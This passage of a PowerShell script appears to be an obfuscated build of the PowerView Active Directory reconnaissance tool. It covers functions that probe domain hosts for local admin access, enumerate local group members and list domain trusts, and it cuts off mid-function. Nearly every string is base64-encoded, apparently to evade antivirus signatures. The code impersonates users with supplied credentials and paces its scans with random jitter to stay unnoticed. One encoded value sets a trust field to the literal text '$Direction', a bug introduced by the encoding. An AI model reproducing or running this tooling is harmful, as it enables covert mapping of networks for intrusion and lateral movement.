        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTaXRlTmFtZQ==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU=")))] = $SiteName }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))]) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gUXVlcnlpbmcgY29tcHV0ZXJzIGluIHRoZSBkb21haW4=")))
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gVGFyZ2V0Q29tcHV0ZXJzIGxlbmd0aDogezB9"))) -f $($TargetComputers.Length))
        if ($TargetComputers.Length -eq 0) {
            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gTm8gaG9zdHMgZm91bmQgdG8gZW51bWVyYXRl")))
        }

        
        $HostEnumBlock = {
            Param($ComputerName, $TokenHandle)

            if ($TokenHandle) {
                
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    
                    $Access = Test-AdminAccess -ComputerName $TargetComputer
                    if ($Access.IsAdmin) {
                        $TargetComputer
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {

            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gVG90YWwgbnVtYmVyIG9mIGhvc3RzOiB7MH0="))) -f $($TargetComputers.count))
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gRGVsYXk6ICREZWxheSwgSml0dGVyOiAkSml0dGVy")))
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gRW51bWVyYXRpbmcgc2VydmVyICRUYXJnZXRDb21wdXRlciAoJENvdW50ZXIgb2YgezB9KQ=="))) -f $($TargetComputers.count))
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $LogonToken
            }
        }
        else {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gVXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkczogJFRocmVhZHM=")))

            
            $ScriptParams = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9rZW5IYW5kbGU="))) = $LogonToken
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainLocalGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5pc3RyYXRvcnM="))),

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVBJ"))),

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZG5zaG9zdG5hbWU=")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJEb21haW4=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $ComputerDomain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJMREFQRmlsdGVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZWFyY2hCYXNl")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $ComputerSearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))] = $Unconstrained }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW5nU3lzdGVt")))] = $OperatingSystem }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZXJ2aWNlUGFjaw==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZVBhY2s=")))] = $ServicePack }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTaXRlTmFtZQ==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU=")))] = $SiteName }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))]) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gUXVlcnlpbmcgY29tcHV0ZXJzIGluIHRoZSBkb21haW4=")))
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gVGFyZ2V0Q29tcHV0ZXJzIGxlbmd0aDogezB9"))) -f $($TargetComputers.Length))
        if ($TargetComputers.Length -eq 0) {
            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gTm8gaG9zdHMgZm91bmQgdG8gZW51bWVyYXRl")))
        }

        
        $HostEnumBlock = {
            Param($ComputerName, $GroupName, $Method, $TokenHandle)

            
            if ($GroupName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5pc3RyYXRvcnM=")))) {
                $AdminSecurityIdentifier = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                $GroupName = ($AdminSecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value -split ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))))[-1]
            }

            if ($TokenHandle) {
                
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $NetLocalGroupMemberArguments = @{
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) = $TargetComputer
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWV0aG9k"))) = $Method
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) = $GroupName
                    }
                    Get-NetLocalGroupMember @NetLocalGroupMemberArguments
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {

            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gVG90YWwgbnVtYmVyIG9mIGhvc3RzOiB7MH0="))) -f $($TargetComputers.count))
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gRGVsYXk6ICREZWxheSwgSml0dGVyOiAkSml0dGVy")))
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gRW51bWVyYXRpbmcgc2VydmVyICRUYXJnZXRDb21wdXRlciAoJENvdW50ZXIgb2YgezB9KQ=="))) -f $($TargetComputers.count))
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $GroupName, $Method, $LogonToken
            }
        }
        else {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluTG9jYWxHcm91cE1lbWJlcl0gVXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkczogJFRocmVhZHM=")))

            
            $ScriptParams = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) = $GroupName
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWV0aG9k"))) = $Method
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9rZW5IYW5kbGU="))) = $LogonToken
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}








function Get-DomainTrust {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $TrustAttributes = @{
            [uint32]'0x00000001' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9OX1RSQU5TSVRJVkU=")))
            [uint32]'0x00000002' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVBMRVZFTF9PTkxZ")))
            [uint32]'0x00000004' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RklMVEVSX1NJRFM=")))
            [uint32]'0x00000008' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rk9SRVNUX1RSQU5TSVRJVkU=")))
            [uint32]'0x00000010' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q1JPU1NfT1JHQU5JWkFUSU9O")))
            [uint32]'0x00000020' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V0lUSElOX0ZPUkVTVA==")))
            [uint32]'0x00000040' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VFJFQVRfQVNfRVhURVJOQUw=")))
            [uint32]'0x00000080' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VFJVU1RfVVNFU19SQzRfRU5DUllQVElPTg==")))
            [uint32]'0x00000100' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VFJVU1RfVVNFU19BRVNfS0VZUw==")))
            [uint32]'0x00000200' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q1JPU1NfT1JHQU5JWkFUSU9OX05PX1RHVF9ERUxFR0FUSU9O")))
            [uint32]'0x00000400' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UElNX1RSVVNU")))
        }

        $LdapSearcherArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $LdapSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
    }

    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVBJ")))) {
            $NetSearcherArguments = @{}
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
                    $SourceDomain = (Get-Domain -Credential $Credential).Name
                }
                else {
                    $SourceDomain = (Get-Domain).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TkVU")))) {
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                $SourceDomain = $Env:USERDNSDOMAIN
            }
        }

        if ($PsCmdlet.ParameterSetName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUA==")))) {
            
            $TrustSearcher = Get-DomainSearcher @LdapSearcherArguments
            $SourceSID = Get-DomainSID @NetSearcherArguments

            if ($TrustSearcher) {

                $TrustSearcher.Filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdENsYXNzPXRydXN0ZWREb21haW4p")))

                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $TrustSearcher.FindOne() }
                else { $Results = $TrustSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $DomainTrust = New-Object PSObject

                    $TrustAttrib = @()
                    $TrustAttrib += $TrustAttributes.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $TrustAttributes[$_] }

                    $Direction = Switch ($Props.trustdirection) {
                        0 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlzYWJsZWQ="))) }
                        1 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5ib3VuZA=="))) }
                        2 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0Ym91bmQ="))) }
                        3 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QmlkaXJlY3Rpb25hbA=="))) }
                    }

                    $TrustType = Switch ($Props.trusttype) {
                        1 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V0lORE9XU19OT05fQUNUSVZFX0RJUkVDVE9SWQ=="))) }
                        2 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V0lORE9XU19BQ1RJVkVfRElSRUNUT1JZ"))) }
                        3 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TUlU"))) }
                    }

                    $Distinguishedname = $Props.distinguishedname[0]
                    $SourceNameIndex = $Distinguishedname.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))
                    if ($SourceNameIndex) {
                        $SourceDomain = $($Distinguishedname.SubString($SourceNameIndex)) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                    }
                    else {
                        $SourceDomain = ""
                    }

                    $TargetNameIndex = $Distinguishedname.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LENOPVN5c3RlbQ=="))))
                    if ($SourceNameIndex) {
                        $TargetDomain = $Distinguishedname.SubString(3, $TargetNameIndex-3)
                    }
                    else {
                        $TargetDomain = ""
                    }

                    $ObjectGuid = New-Object Guid @(,$Props.objectguid[0])
                    $TargetSID = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value

                    $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U291cmNlTmFtZQ=="))) $SourceDomain
                    $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0TmFtZQ=="))) $Props.name[0]
                    
                    $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHJ1c3RUeXBl"))) $TrustType
                    $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHJ1c3RBdHRyaWJ1dGVz"))) $($TrustAttrib -join ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))))
                    $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHJ1c3REaXJlY3Rpb24="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JERpcmVjdGlvbg==")))
                    $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2hlbkNyZWF0ZWQ="))) $Props.whencreated[0]
                    $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2hlbkNoYW5nZWQ="))) $Props.whenchanged[0]
                    $DomainTrust.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkRvbWFpblRydXN0LkxEQVA="))))
                    $DomainTrust
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
